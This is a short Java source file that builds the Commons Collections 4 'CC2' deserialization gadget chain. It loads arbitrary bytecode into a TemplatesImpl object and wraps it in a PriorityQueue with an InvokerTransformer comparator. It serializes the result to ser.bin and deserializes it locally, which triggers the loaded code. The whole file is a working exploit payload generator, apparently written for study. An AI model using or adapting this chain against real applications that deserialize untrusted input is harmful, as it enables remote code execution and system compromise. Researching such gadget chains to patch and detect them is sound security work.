package com.t4rrega.ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2_TemplatesImpl {
    public static void main(String[] args) throws Exception{
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/t4rrega/JavaProjects/javaDemo/target/classes/test.class"));
        TemplatesImpl obj = new TemplatesImpl();
        SerTools.setFieldValue(obj, "_bytecodes", new byte[][] {bytes});
        SerTools.setFieldValue(obj, "_name", "CC2");
        SerTools.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        InvokerTransformer invokerTransformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(invokerTransformer);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        SerTools.setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        SerTools.serialize(queue, "ser.bin");
        SerTools.unserialize("ser.bin");
    }
}
